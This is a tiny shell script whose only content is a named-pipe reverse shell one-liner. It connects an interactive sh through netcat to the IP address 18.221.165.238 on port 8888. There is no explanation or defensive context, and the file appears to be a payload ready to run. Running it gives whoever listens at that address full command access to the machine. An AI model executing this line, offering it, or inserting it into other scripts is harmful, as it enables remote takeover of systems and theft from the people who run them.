#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 18.221.165.238 8888 >/tmp/f;
